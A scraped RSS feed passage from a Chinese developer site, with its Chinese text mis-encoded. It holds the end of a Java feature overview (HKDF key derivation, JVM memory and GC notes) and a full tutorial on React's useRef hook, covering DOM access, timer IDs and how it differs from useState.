<h3 data-id="heading-43">5.6. å¯†é’¥æ´¾ç”Ÿå‡½æ•°API</h3>
<p>æä¾›äº†ç”ŸæˆåŠ å¯†å¯†é’¥çš„æ ‡å‡†æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨HKDFç®—æ³•ä»ä¸»å¯†é’¥æ´¾ç”Ÿå­å¯†é’¥</span>
<span class="hljs-type">SecretKey</span> <span class="hljs-variable">masterKey</span> <span class="hljs-operator">=</span> ... <span class="hljs-comment">// ä¸»å¯†é’¥</span>
<span class="hljs-type">KDF</span> <span class="hljs-variable">kdf</span> <span class="hljs-operator">=</span> KDF.of(<span class="hljs-string">"HKDF-SHA256"</span>);
<span class="hljs-type">SecretKey</span> <span class="hljs-variable">derivedKey</span> <span class="hljs-operator">=</span> kdf.deriveKey(masterKey, <span class="hljs-string">"ä¼šè¯å¯†é’¥"</span>.getBytes(), <span class="hljs-number">32</span>);
</code></pre>
<p>åŠ å¯†å¼€å‘æ›´è§„èŒƒäº†ã€‚ç”¨ä¸€ä¸ªæ ¹å¯†é’¥å®‰å…¨åœ°ç”Ÿæˆå¤šä¸ªå­å¯†é’¥ï¼Œå°±åƒç”¨ä¸€æŠŠä¸»é’¥åŒ™é…å‡ºå‡ æŠŠä¸åŒç”¨é€”çš„æˆ¿é—¨é’¥åŒ™ï¼Œæ˜¯æ„å»ºç°ä»£å®‰å…¨ç³»ç»Ÿçš„åŸºç¡€ã€‚</p>
<h3 data-id="heading-44">5.7. JVMä¸åº•å±‚ï¼šæ›´çœå†…å­˜ï¼Œæ›´å¿«å¯åŠ¨</h3>
<p><strong>ç´§å‡‘å¯¹è±¡å¤´</strong>ï¼šæ˜¾è‘—å‡å°‘äº†64ä½ç³»ç»Ÿä¸Šæ¯ä¸ªå¯¹è±¡çš„å†…å­˜å¼€é”€ã€‚å‡è®¾ä½ çš„åº”ç”¨æœ‰æ•°ç™¾ä¸‡ä¸ªå°å‹å¯¹è±¡ï¼ˆå¦‚è®¢å•é¡¹ã€DTOï¼‰ï¼Œè¿™ä¸ªä¼˜åŒ–å¯èƒ½ç›´æ¥å¸¦æ¥10%ä»¥ä¸Šçš„å †å†…å­˜èŠ‚çœï¼Œå¹¶å› æ›´å¥½çš„ç¼“å­˜åˆ©ç”¨ç‡è€Œæå‡é€Ÿåº¦ã€‚</p>
<p><strong>åˆ†ä»£Shenandoahåƒåœ¾å›æ”¶å™¨</strong>ï¼šä½æš‚åœæ—¶é—´çš„GCç°åœ¨å¯¹å¹´è½»ä»£å’Œè€å¹´ä»£é‡‡ç”¨ä¸åŒä¼˜åŒ–ç­–ç•¥ï¼Œåœ¨ä¿æŒâ€œåœé¡¿æ—¶é—´çŸ­â€ä¼˜ç‚¹çš„åŒæ—¶ï¼Œæå‡äº†æ•´ä½“ååé‡å’Œå†…å­˜æ•ˆç‡ã€‚å¯¹äºéœ€è¦é«˜å“åº”æ€§çš„æœåŠ¡ï¼ˆå¦‚äº¤æ˜“ç³»ç»Ÿï¼‰æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚</p>
<p><strong>æå‰æ–¹æ³•åˆ†æä¸JFRå¢å¼º</strong>ï¼šå‰è€…é€šè¿‡å¤ç”¨åˆ†ææ•°æ®åŠ é€Ÿå¤§å‹åº”ç”¨çš„å¯åŠ¨ï¼›åè€…å¦‚æ–¹æ³•å‰–æï¼Œèƒ½å¸®ä½ ç²¾å‡†å®šä½åˆ°æ¶ˆè€—CPUçš„å…·ä½“æ–¹æ³•ï¼Œè€Œä¸æ˜¯ä»…ä»…åœç•™åœ¨ç±»å±‚é¢ï¼Œè®©æ€§èƒ½è°ƒä¼˜äº‹åŠåŠŸå€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ React ä¸­çš„ useRefï¼šä¸åªæ˜¯è·å– DOM å…ƒç´ ]]></title>    <link>https://juejin.cn/post/7589930672833478691</link>    <guid>https://juejin.cn/post/7589930672833478691</guid>    <pubDate>2026-01-01T12:05:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589930672833478691" data-draft-id="7589935326782013474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ React ä¸­çš„ useRefï¼šä¸åªæ˜¯è·å– DOM å…ƒç´ "/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2026-01-01T12:05:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ohyeah"/> <meta itemprop="url" content="https://juejin.cn/user/740446536480618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ React ä¸­çš„ useRefï¼šä¸åªæ˜¯è·å– DOM å…ƒç´ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/740446536480618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ohyeah
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T12:05:00.000Z" title="Thu Jan 01 2026 12:05:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ React å‡½æ•°ç»„ä»¶çš„ä¸–ç•Œä¸­ï¼Œ<code>useRef</code> æ˜¯ä¸€ä¸ªå¸¸è¢«æåŠä½†åˆå®¹æ˜“è¢«è¯¯è§£çš„ Hookã€‚å¾ˆå¤šåˆå­¦è€…ç¬¬ä¸€æ¬¡æ¥è§¦å®ƒæ—¶ï¼Œå¾€å¾€åªæŠŠå®ƒå½“ä½œâ€œè·å– DOM å…ƒç´ â€çš„å·¥å…·ï¼›è€Œéšç€ä½¿ç”¨æ·±å…¥ï¼Œåˆå¯èƒ½ä¼šç–‘æƒ‘ï¼šä¸ºä»€ä¹ˆä¸èƒ½ç”¨ <code>useRef</code> æ›¿ä»£ <code>useState</code> æ¥é¿å…ä¸å¿…è¦çš„é‡æ¸²æŸ“ï¼Ÿæœ¬æ–‡å°†ç»“åˆä¸¤ä¸ªå…¸å‹ç¤ºä¾‹ï¼Œç³»ç»Ÿæ¢³ç† <code>useRef</code> çš„æ ¸å¿ƒæœºåˆ¶ã€ä½¿ç”¨åœºæ™¯ä¸å¸¸è§è¯¯åŒºï¼Œå¸®åŠ©ä½ çœŸæ­£æŒæ¡è¿™ä¸ªâ€œé»˜é»˜å¥‰çŒ®â€çš„ Hookã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€useRef çš„åŸºæœ¬èƒ½åŠ›ï¼šæŒä¹…åŒ–å¼•ç”¨å¯¹è±¡</h2>
<p><code>useRef</code> çš„æœ¬è´¨æ˜¯åˆ›å»ºä¸€ä¸ª<strong>å¯å˜ä¸”æŒä¹…åŒ–çš„å¼•ç”¨å¯¹è±¡</strong>ã€‚å®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªæ™®é€š JavaScript å¯¹è±¡ï¼Œç»“æ„ä¸º <code>{ current: initialValue }</code>ã€‚å…³é”®åœ¨äºï¼š</p>
<ul>
<li><strong>æ¯æ¬¡ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œ<code>useRef</code> è¿”å›çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨</strong>ï¼›</li>
<li>ä¿®æ”¹ <code>.current</code> å±æ€§<strong>ä¸ä¼šè§¦å‘ç»„ä»¶é‡æ–°æ¸²æŸ“</strong>ï¼›</li>
<li>å®ƒä¸å‚ä¸ React çš„å“åº”å¼æ›´æ–°æœºåˆ¶ï¼Œå› æ­¤è¢«ç§°ä¸ºâ€œéå“åº”å¼å­˜å‚¨â€ã€‚</li>
</ul>
<p>è¿™ä¸ <code>useState</code> å½¢æˆé²œæ˜å¯¹æ¯”ï¼š<code>useState</code> çš„çŠ¶æ€å˜æ›´ä¼šè§¦å‘ UI æ›´æ–°ï¼Œè€Œ <code>useRef</code> çš„å˜æ›´åˆ™â€œé™é»˜â€å‘ç”Ÿã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€åœºæ™¯ä¸€ï¼šè·å– DOM å…ƒç´ å¹¶æ“ä½œ</h2>
<p>æœ€å¸¸è§çš„ <code>useRef</code> ç”¨æ³•æ˜¯ç»‘å®šåˆ° JSX å…ƒç´ ä¸Šï¼Œä»è€Œåœ¨ç»„ä»¶é€»è¾‘ä¸­ç›´æ¥æ“ä½œ DOMã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useRef, useEffect, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ç»„ä»¶æŒ‚è½½åï¼ŒinputRef.current æŒ‡å‘çœŸå®çš„ &lt;input&gt; å…ƒç´ </span>
    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>();
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> /&gt;</span>
      {count}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;count ++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>åˆå§‹æ¸²æŸ“æ—¶ï¼Œ<code>inputRef.current</code> ä¸º <code>null</code>ï¼Œå› ä¸º DOM å°šæœªç”Ÿæˆï¼›</li>
<li>React åœ¨å®Œæˆ DOM æŒ‚è½½åï¼Œä¼šè‡ªåŠ¨å°†å¯¹åº”çš„ DOM èŠ‚ç‚¹èµ‹å€¼ç»™ <code>ref.current</code>ï¼›</li>
<li><code>useEffect</code>ï¼ˆä¾èµ–é¡¹ä¸ºç©ºæ•°ç»„ï¼‰åœ¨é¦–æ¬¡æŒ‚è½½åæ‰§è¡Œï¼Œæ­¤æ—¶ <code>inputRef.current</code> å·²æ˜¯æœ‰æ•ˆçš„ <code>&lt;input&gt;</code> å…ƒç´ ï¼Œè°ƒç”¨ <code>.focus()</code> å®ç°è‡ªåŠ¨èšç„¦ã€‚</li>
</ul>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š<strong>å³ä½¿ <code>inputRef.current</code> ä» <code>null</code> å˜ä¸º DOM èŠ‚ç‚¹ï¼Œç»„ä»¶ä¹Ÿä¸ä¼šé‡æ–°æ¸²æŸ“</strong>ã€‚è¿™æ­£æ˜¯ <code>useRef</code> çš„è®¾è®¡åˆè¡·â€”â€”æä¾›ä¸€ç§ä¸å¹²æ‰° React æ¸²æŸ“æµç¨‹çš„æ–¹å¼æ¥è®¿é—®æˆ–å­˜å‚¨æ•°æ®ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€åœºæ™¯äºŒï¼šå­˜å‚¨å¯å˜å€¼ä»¥é¿å…çŠ¶æ€é‡ç½®</h2>
<p>é™¤äº†æ“ä½œ DOMï¼Œ<code>useRef</code> è¿˜éå¸¸é€‚åˆç”¨äº<strong>åœ¨å¤šæ¬¡æ¸²æŸ“ä¹‹é—´æŒä¹…åŒ–å­˜å‚¨å¯å˜å€¼</strong>ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å‰¯ä½œç”¨ï¼ˆå¦‚å®šæ—¶å™¨ï¼‰æ—¶ã€‚</p>
<p>è€ƒè™‘ä»¥ä¸‹é”™è¯¯å†™æ³•ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä½¿ç”¨æ™®é€šå˜é‡å­˜å‚¨å®šæ—¶å™¨ ID</span>
<span class="hljs-keyword">let</span> intervalId = <span class="hljs-literal">null</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
  intervalId = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>);
  }, <span class="hljs-number">1000</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
  <span class="hljs-built_in">clearInterval</span>(intervalId); <span class="hljs-comment">// å¯èƒ½ä¸º nullï¼</span>
}
</code></pre>
<p>é—®é¢˜åœ¨äºï¼šæ¯å½“ <code>count</code> çŠ¶æ€æ›´æ–°ï¼Œæ•´ä¸ªå‡½æ•°ç»„ä»¶ä¼šé‡æ–°æ‰§è¡Œï¼Œ<code>let intervalId = null</code> ä¼šè¢«å†æ¬¡åˆå§‹åŒ–ï¼Œå¯¼è‡´ä¹‹å‰ä¿å­˜çš„å®šæ—¶å™¨ ID ä¸¢å¤±ã€‚ç»“æœæ˜¯ï¼š</p>
<ul>
<li>å¤šæ¬¡ç‚¹å‡»â€œå¼€å§‹â€ä¼šåˆ›å»ºå¤šä¸ªå®šæ—¶å™¨ï¼›</li>
<li>â€œåœæ­¢â€æŒ‰é’®æ— æ³•æ¸…é™¤æ—§çš„å®šæ—¶å™¨ï¼›</li>
<li>é€ æˆ<strong>å†…å­˜æ³„æ¼</strong>å’Œ<strong>é€»è¾‘æ··ä¹±</strong>ã€‚</li>
</ul>
<p>æ­£ç¡®çš„åšæ³•æ˜¯ä½¿ç”¨ <code>useRef</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> intervalId = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    intervalId.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>);
    }, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">clearInterval</span>(intervalId.<span class="hljs-property">current</span>);
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{start}</span>&gt;</span>å¼€å§‹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{stop}</span>&gt;</span>åœæ­¢<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      {count}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;count ++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<p>è¿™é‡Œçš„å…³é”®åœ¨äºï¼š</p>
<ul>
<li><code>useRef(null)</code> åœ¨ç»„ä»¶æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å§‹ç»ˆè¿”å›<strong>åŒä¸€ä¸ªå¯¹è±¡</strong>ï¼›</li>
<li>å³ä½¿ <code>count</code> æ›´æ–°å¯¼è‡´ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œ<code>intervalId.current</code> ä¾ç„¶ä¿ç•™ç€ä¸Šæ¬¡è®¾ç½®çš„å®šæ—¶å™¨ IDï¼›</li>
<li>å› æ­¤ <code>clearInterval</code> èƒ½æ­£ç¡®æ¸…é™¤ç›®æ ‡å®šæ—¶å™¨ï¼Œé¿å…èµ„æºæ³„éœ²ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-3">å››ã€useRef ä¸ useState çš„æ ¸å¿ƒåŒºåˆ«</h2>
<p>è™½ç„¶ <code>useRef</code> å’Œ <code>useState</code> éƒ½èƒ½â€œå­˜å€¼â€ï¼Œä½†å®ƒä»¬çš„è®¾è®¡ç›®æ ‡æˆªç„¶ä¸åŒï¼š</p>






























<table><thead><tr><th>ç‰¹æ€§</th><th><code>useState</code></th><th><code>useRef</code></th></tr></thead><tbody><tr><td>æ˜¯å¦è§¦å‘é‡æ¸²æŸ“</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>å€¼å˜æ›´æ˜¯å¦è¢« React è·Ÿè¸ª</td><td>âœ… æ˜¯ï¼ˆé€šè¿‡è°ƒåº¦æ›´æ–°ï¼‰</td><td>âŒ å¦</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>é©±åŠ¨ UI å˜åŒ–çš„çŠ¶æ€</td><td>å­˜å‚¨ä¸éœ€è§¦å‘ UI æ›´æ–°çš„å¯å˜æ•°æ®</td></tr><tr><td>åˆå§‹å€¼</td><td>æ¯æ¬¡è°ƒç”¨ <code>useState(initial)</code> ä»…åœ¨é¦–æ¬¡ç”Ÿæ•ˆ</td><td><code>useRef(initial)</code> çš„åˆå§‹å€¼ä¹Ÿä»…åœ¨é¦–æ¬¡ç”Ÿæ•ˆï¼Œä½†åç»­ <code>.current</code> å¯ä»»æ„ä¿®æ”¹</td></tr></tbody></table>
<h3 data-id="heading-4">å¸¸è§è¯¯åŒºï¼šèƒ½å¦ç”¨ useRef æ›¿ä»£ useStateï¼Ÿ</h3>
<p><strong>ä¸èƒ½ã€‚</strong></p>
<p>å‡è®¾ä½ è¯•å›¾ç”¨ <code>useRef</code> å­˜å‚¨è®¡æ•°å™¨å€¼ä»¥â€œé¿å…é‡æ¸²æŸ“â€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// ...</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> countRef.current++}&gt;+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{countRef.current}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
</code></pre>
<p>ä½ ä¼šå‘ç°ï¼šç‚¹å‡»æŒ‰é’®åï¼Œé¡µé¢ä¸Šçš„æ•°å­—<strong>ä¸ä¼šæ›´æ–°</strong>ï¼å› ä¸º React å¹¶ä¸çŸ¥é“ <code>countRef.current</code> å‘ç”Ÿäº†å˜åŒ–ï¼Œè‡ªç„¶ä¸ä¼šé‡æ–°æ‰§è¡Œæ¸²æŸ“é€»è¾‘ã€‚</p>
<p><strong>ç»“è®º</strong>ï¼š</p>
<ul>
<li>å¦‚æœä½ éœ€è¦<strong>åŒæ—¶å­˜å‚¨å€¼å¹¶æ›´æ–° UI</strong>ï¼Œå¿…é¡»ä½¿ç”¨ <code>useState</code>ï¼›</li>
<li>å¦‚æœä½ åªéœ€è¦<strong>åœ¨ä¸è§¦å‘é‡æ¸²æŸ“çš„å‰æä¸‹ä¿å­˜ä¸­é—´çŠ¶æ€æˆ–å¼•ç”¨</strong>ï¼ˆå¦‚å®šæ—¶å™¨ IDã€å‰ä¸€æ¬¡çš„ propsã€æ»šåŠ¨ä½ç½®ç­‰ï¼‰ï¼Œæ‰åº”ä½¿ç”¨ <code>useRef</code>ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-5">äº”ã€useRef çš„å…¸å‹åº”ç”¨åœºæ™¯æ€»ç»“</h2>
<ol>
<li>
<p><strong>è®¿é—® DOM èŠ‚ç‚¹</strong><br/>
å¦‚èšç„¦è¾“å…¥æ¡†ã€æµ‹é‡å…ƒç´ å°ºå¯¸ã€è§¦å‘åŠ¨ç”»ç­‰ã€‚</p>
</li>
<li>
<p><strong>æŒä¹…åŒ–å­˜å‚¨å¯å˜å€¼</strong></p>
<ul>
<li>å®šæ—¶å™¨/å»¶æ—¶å™¨ IDï¼ˆ<code>setInterval</code> / <code>setTimeout</code>ï¼‰</li>
<li>WebSocket å®ä¾‹</li>
<li>ç¬¬ä¸‰æ–¹åº“çš„å®ä¾‹ï¼ˆå¦‚åœ°å›¾ã€å›¾è¡¨å¯¹è±¡ï¼‰</li>
<li>ä¸Šä¸€æ¬¡çš„ props æˆ– stateï¼ˆç”¨äºå¯¹æ¯”ï¼‰</li>
</ul>
</li>
<li>
<p><strong>è·¨æ¸²æŸ“ä¿æŒçŠ¶æ€è€Œä¸è§¦å‘æ›´æ–°</strong><br/>
ä¾‹å¦‚è®°å½•ç»„ä»¶æ˜¯å¦å·²æŒ‚è½½ï¼ˆåœ¨å¼‚æ­¥å›è°ƒä¸­åˆ¤æ–­æ˜¯å¦è¿˜èƒ½å®‰å…¨ setStateï¼‰ã€‚</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-6">ç»“è¯­</h2>
<p><code>useRef</code> è™½ç„¶åå­—é‡Œæœ‰ â€œrefâ€ï¼Œä½†å®ƒè¿œä¸æ­¢æ˜¯â€œè·å– DOM çš„å·¥å…·â€ã€‚å®ƒæ˜¯ä¸€ä¸ª<strong>è½»é‡çº§ã€éå“åº”å¼çš„æŒä¹…åŒ–å®¹å™¨</strong>ï¼Œåœ¨éœ€è¦â€œè®°ä½æŸäº›ä¸œè¥¿ä½†åˆä¸æƒ³æ‰“æ‰° React æ¸²æŸ“æµç¨‹â€æ—¶å¤§æ˜¾èº«æ‰‹ã€‚</p>
<p>æ­£ç¡®ä½¿ç”¨ <code>useRef</code>ï¼Œèƒ½è®©ä½ çš„ç»„ä»¶æ›´é«˜æ•ˆã€æ›´å¥å£®ï¼›è€Œè¯¯ç”¨å®ƒï¼ˆå¦‚è¯•å›¾æ›¿ä»£çŠ¶æ€ç®¡ç†ï¼‰ï¼Œåˆ™ä¼šå¯¼è‡´ UI ä¸æ›´æ–°æˆ–é€»è¾‘é”™ä¹±ã€‚ç†è§£å…¶â€œéå“åº”å¼â€å’Œâ€œå¼•ç”¨æŒä¹…åŒ–â€çš„ä¸¤å¤§ç‰¹æ€§ï¼Œæ˜¯æŒæ¡è¿™ä¸€ Hook çš„å…³é”®ã€‚</p>
